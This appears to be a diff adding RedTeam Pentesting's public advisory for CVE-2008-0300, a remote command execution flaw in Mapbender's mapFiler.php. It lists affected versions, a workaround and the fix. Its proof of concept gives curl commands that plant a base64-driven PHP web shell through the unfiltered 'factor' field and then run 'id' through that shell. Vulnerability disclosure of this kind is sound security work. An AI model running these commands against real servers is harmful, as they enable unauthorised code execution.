@@ -1,0 +1,139 @@
+Advisory: Remote Command Execution in Mapbender
+
+During a penetration test RedTeam Pentesting discovered a remote command
+execution vulnerability in Mapbender. An unauthorized user can create
+arbitrary PHP-files on the Mapbender webserver, which can later be
+executed.
+
+
+Details
+=======
+
+Product: Mapbender
+Affected Versions: 2.4 - 2.4.4 (verified), probably older versions, too
+Fixed Versions: 2.4.5rc1
+Vulnerability Type: Remote Command Execution
+Security-Risk: high
+Vendor-URL: http://www.mapbender.org
+Vendor-Status: informed, fixed version released
+Advisory-URL: http://www.redteam-pentesting.de/advisories/rt-sa-2008-001.php
+Advisory-Status: public
+CVE: CVE-2008-0300
+CVE-URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0300
+
+
+Introduction
+============
+
+"Mapbender is the software and portal site for geodata management of OGC
+OWS architectures. The software provides web technology for managing
+spatial data services implemented in PHP, JavaScript and XML. It
+provides a data model and interfaces for displaying, navigating and
+querying OGC compliant map services. The Mapbender framework furthermore
+provides authentication and authorization services, OWS proxy
+functionality, management interfaces for user, group and service
+administration in WebGIS projects."
+
+(from the vendor's homepage)
+
+
+More Details
+============
+
+The Mapbender software comes with a script mapFiler.php, which is
+located at
+
+http://www.example.com/tools/mapFiler.php
+
+Due to the lack of input filtering, an attacker is able to enter valid PHP
+code in the "factor" input field. This PHP code is written into a newly
+generated file in the Mapbender webfolder. Therefore, it is possible to
+remotely execute the code by requesting the new file.
+
+
+Proof of Concept
+================
+
+For this example, the user account which is used to execute php scripts
+needs permissions to write files to the tmp directory. Any other directory
+with write permissions in the web root can be used, too.
+
+Calling
+
+curl -d "myLocation=../tmp/.&factor=<?php passthru(base64_decode(
+    \$_GET[c])) ?>.php&button=let's go" http://www.example.com/
+    tools/mapFiler.php
+
+creates a file
+
+tmp/_\<\?php\ passthru\(base64_decode\(\$_GET\[c\]\)\)\ \?\>.php.
+
+with the content:
+
+#Modified by MapbenderTools
+#Date: 14.01.2008
+#Factor: <?php passthru(base64_decode($_GET[c])) ?>.php
+
+This script can then be executed by calling:
+
+curl -g 'http://www.example.com/tmp/_<%3fphp%20passthru(base64_decode(
+    $_GET[c]))%20%3f>.php.?c=aWQ'
+
+It returns:
+
+#Modified by MapbenderTools
+#Date: 15.01.2008
+#Factor: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+.php
+
+Commands sent to the script have to be base64 encoded and will be decoded by the
+PHP code, to avoid possible URL filtering on the victim's side.
+
+
+Workaround
+==========
+
+If not needed, the mapfiler.php script can be removed. Otherwise, it can
+be protected by using an .htaccess directive.
+
+
+Fix
+===
+
+The vulnerability is fixed in release 2.4.5 rc1.
+
+
+Security Risk
+=============
+
+The security risk is rated as high. An attacker can execute arbitrary
+commands remotely with the rights of the webserver.
+
+
+History
+=======
+
+2007-12-14 Problem identified during a penetration test
+2008-01-09 Customer approves contacting of Mapbender developers
+2008-01-17 CVE number assigned
+2008-03-10 Vendor releases fixed version
+2008-03-11 Advisory released
+
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting is offering individual penetration tests, short
+pentests, performed by a team of specialised IT-security experts.
+Hereby, security weaknesses in company networks or products are
+uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at
+http://www.redteam-pentesting.de.
+
+# milw0rm.com [2008-03-11]
